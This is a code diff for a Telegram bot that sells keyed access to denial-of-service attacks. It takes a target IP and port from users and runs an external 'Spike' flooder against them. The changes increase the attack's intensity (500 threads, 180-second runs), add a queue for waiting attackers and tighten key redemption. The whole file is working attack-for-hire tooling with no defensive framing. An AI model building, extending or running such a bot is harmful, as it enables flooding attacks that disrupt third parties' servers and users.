@@ -16,9 +16,9 @@ keys = {}  # {key: expiry_time}
 ADMIN_ID = 7163028849  # Replace with your admin's Telegram ID
 
 # Define default values
-DEFAULT_PACKET_SIZE = 1024
-DEFAULT_THREADS = 10
-MAX_ATTACK_TIME = 60  # in seconds
+DEFAULT_PACKET_SIZE = 12
+DEFAULT_THREADS = 500
+MAX_ATTACK_TIME = 180  # in seconds
 
 # Function to generate random keys
 def generate_key(duration):
@@ -35,23 +35,41 @@ def parse_duration(duration_str):
     return None
 
 # Function to run the attack
-def attack(ip, port, context, chat_id):
+import asyncio
+
+def attack(ip, port, context, chat_id, attacker_id):
     global attack_running
 
-    # Run the attack command
-    subprocess.run(["./Spike", ip, port, str(MAX_ATTACK_TIME), str(DEFAULT_PACKET_SIZE), str(DEFAULT_THREADS)])
+    # Start the attack
+    process = subprocess.Popen(["./Spike", ip, port, str(MAX_ATTACK_TIME), str(DEFAULT_PACKET_SIZE), str(DEFAULT_THREADS)])
+    
+    # Wait for the attack duration
+    time.sleep(MAX_ATTACK_TIME)  # Ensures the attack runs for the given time
 
-    # Notify that the attack is finished
+    # Mark attack as finished BEFORE sending notifications
+    attack_running = False
+
+    # Notify the attacker that the attack is finished
     attack_finished_message = (
-        f"✅ 𝘈𝘵𝘵𝘢𝘤𝘬 𝘧𝘪𝘯𝘪𝘴𝘩𝘦𝘥!\n\n"
-        f"𝗧𝗮𝗿𝗴𝗲𝘁𝗲𝗱 𝗜𝗣: `{ip}`\n"
-        f"𝗣𝗼𝗿𝘁: `{port}`\n"
-        f"𝗧𝗶𝗺𝗲: `{MAX_ATTACK_TIME} 𝗌𝖾𝖼𝗈𝗇𝖽𝗌`"
+        f"✅ **Attack Finished!**\n\n"
+        f"🎯 **Target IP:** `{ip}`\n"
+        f"📌 **Port:** `{port}`\n"
+        f"⏳ **Duration:** `{MAX_ATTACK_TIME} seconds`"
     )
     asyncio.run(context.bot.send_message(chat_id=chat_id, text=attack_finished_message, parse_mode="Markdown"))
 
-    # Mark attack as finished
-    attack_running = False
+    # Notify users who tried to start an attack while one was running
+    for pending_user in pending_users:
+        asyncio.run(context.bot.send_message(
+            chat_id=pending_user, 
+            text="✅ **Another user's attack has finished. You can now start your attack!**"
+        ))
+
+    # Clear the pending users list
+    pending_users.clear()
+
+
+
 
 # Command: Start the bot
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -92,18 +110,24 @@ async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(help_message, parse_mode="Markdown")
 
 # Command: Start an attack
+# Track pending users waiting to attack
+pending_users = set()
+
 async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global attack_running
     user_id = update.message.from_user.id
 
     # Check if user is authorized
     if user_id not in authorized_users or time.time() > authorized_users[user_id]:
-        await update.message.reply_text('❌ 𝘠𝘰𝘶 𝘢𝘳𝘦 𝘯𝘰𝘵 𝘢𝘶𝘵𝘩𝘰𝘳𝘪𝘻𝘦𝘥 𝘵𝘰 𝘶𝘴𝘦 𝘵𝘩𝘪𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥. 𝘙𝘦𝘥𝘦𝘦𝘮 𝘢 𝘬𝘦𝘺 𝘧𝘪𝘳𝘴𝘵.')
+        await update.message.reply_text('❌ You are not authorized. Redeem a key first.')
         return
 
     # Check if an attack is already running
     if attack_running:
-        await update.message.reply_text('⏳ 𝘈𝘯𝘰𝘵𝘩𝘦𝘳 𝘢𝘵𝘵𝘢𝘤𝘬 𝘪𝘴 𝘳𝘶𝘯𝘯𝘪𝘯𝘨. 𝘗𝘭𝘦𝘢𝘴𝘦 𝘸𝘢𝘪𝘵 𝘧𝘰𝘳 𝘪𝘵 𝘵𝘰 𝘧𝘪𝘯𝘪𝘴𝘩.')
+        await update.message.reply_text('⏳ Another attack is running. Please wait...')
+        
+        # Add user to pending users set if not already in it
+        pending_users.add(user_id)
         return
 
     # Validate command arguments
@@ -116,15 +140,16 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Send attack details
     attack_details = (
-        f"🚀 𝘈𝘵𝘵𝘢𝘤𝘬 𝘴𝘵𝘢𝘳𝘵𝘦𝘥!\n\n"
-        f"𝗧𝗮𝗿𝗴𝗲𝘁𝗲𝗱 𝗜𝗣: `{ip}`\n"
-        f"𝗣𝗼𝗿𝘁: `{port}`\n"
-        f"𝗧𝗶𝗺𝗲: `{MAX_ATTACK_TIME} 𝗌𝖾𝖼𝗈𝗇𝖽𝗌`"
+        f"🚀 **Attack Started!**\n\n"
+        f"🎯 **Target IP:** `{ip}`\n"
+        f"📌 **Port:** `{port}`\n"
+        f"⏳ **Duration:** `{MAX_ATTACK_TIME} seconds`"
     )
     await update.message.reply_text(attack_details, parse_mode="Markdown")
 
     # Run the attack in a separate thread
-    threading.Thread(target=attack, args=(ip, port, context, update.message.chat_id)).start()
+    threading.Thread(target=attack, args=(ip, port, context, update.message.chat_id, user_id)).start()
+
 
 # Command: Generate a key (Admin only)
 async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -174,18 +199,29 @@ async def users(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # Command: Redeem a key
 async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.message.from_user.id
+
     if len(context.args) < 1:
         await update.message.reply_text('Usage: /redeem <key>')
         return
 
     key = context.args[0]
+
+    # Check if the key is valid
     if key not in keys or time.time() > keys[key]:
-        await update.message.reply_text('❌ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘰𝘳 𝘦𝘹𝘱𝘪𝘳𝘦𝘥 𝘬𝘦𝘺.')
+        await update.message.reply_text('❌ Invalid or expired key.')
         return
 
-    authorized_users[update.message.from_user.id] = keys[key]
+    # Ensure the user doesn't already have an active key
+    if user_id in authorized_users and time.time() < authorized_users[user_id]:
+        await update.message.reply_text('❌ You already have an active key. Wait for it to expire before redeeming a new one.')
+        return
+
+    # Assign key and remove from the list
+    authorized_users[user_id] = keys[key]
     del keys[key]
-    await update.message.reply_text('✅ 𝘒𝘦𝘺 𝘳𝘦𝘥𝘦𝘦𝘮𝘦𝘥. 𝘠𝘰𝘶 𝘢𝘳𝘦 𝘯𝘰𝘸 𝘢𝘶𝘵𝘩𝘰𝘳𝘪𝘻𝘦𝘥 𝘵𝘰 𝘶𝘴𝘦 /𝘣𝘨𝘮𝘪.')
+    
+    await update.message.reply_text('✅ Key redeemed successfully! You are now authorized to use /bgmi.')
 
 # Main function to start the bot
 def main():
